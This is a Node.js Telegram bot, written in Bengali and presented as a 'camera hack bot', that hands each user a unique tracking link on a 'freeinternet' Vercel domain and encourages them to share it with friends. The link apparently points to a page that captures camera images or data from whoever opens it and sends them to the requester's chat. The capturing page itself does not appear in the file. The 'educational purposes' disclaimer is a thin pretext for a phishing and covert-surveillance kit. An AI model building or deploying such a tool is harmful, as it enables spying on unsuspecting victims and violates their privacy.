const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Start command
bot.command('start', (ctx) => {
    ctx.reply(`🤖 ক্যামেরা হ্যাক বটে স্বাগতম!

এটি শুধুমাত্র মজা এবং শিক্ষামূলক উদ্দেশ্যে তৈরি 🌬️

/create টাইপ করে আপনার ইউনিক লিঙ্ক তৈরি করুন।`);
});

// Create command - মূল কাজ
bot.command('create', (ctx) => {
    const chatId = ctx.message.chat.id;
    const username = ctx.message.chat.username || 'user';
    
    // আপনার Vercel ডোমেইন এখানে বসান
    const domain = process.env.VERCEL_URL || 'https://freeinternet-seven.vercel.app';
    const trackingUrl = `${domain}/track.html?chatid=${chatId}&user=${username}`;
    
    const responseMessage = `
✅ **আপনার ইউনিক ট্র্যাকিং লিঙ্ক তৈরি হয়েছে!** 🌬️

📎 আপনার লিঙ্ক: ${trackingUrl}

⚠️ **নোট:**
- এই বটের URL টেলিগ্রাম ওয়েবে সম্পূর্ণ কাজ করে না
- এই URLটি ক্রোম বা অন্য ব্রাউজারে ব্যবহার করুন ✅️

SG Modder এর ক্ষমতা অনুভব করুন 👍 🌬️

বন্ধুদের সাথে শেয়ার করুন
    `;
    
    ctx.reply(responseMessage, {
        parse_mode: 'Markdown'
    });
});

// Help command
bot.command('help', (ctx) => {
    ctx.reply(`📖 **হেল্প মেনু:**

/start - বট শুরু করুন
/create - ইউনিক লিঙ্ক তৈরি করুন
/help - এই মেসেজ দেখান

🌬️ শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে`);
});

// Vercel serverless function
module.exports = async (req, res) => {
    if (req.method === 'POST') {
        try {
            await bot.handleUpdate(req.body);
            res.status(200).send('OK');
        } catch (err) {
            console.error('Error:', err);
            res.status(500).send('Error');
        }
    } else {
        // GET request এ শুধু confirmation দেয়
        res.status(200).json({ 
            status: 'Bot is running!',
            timestamp: new Date().toISOString(),
            message: 'Webhook manually configured'
        });
    }
};
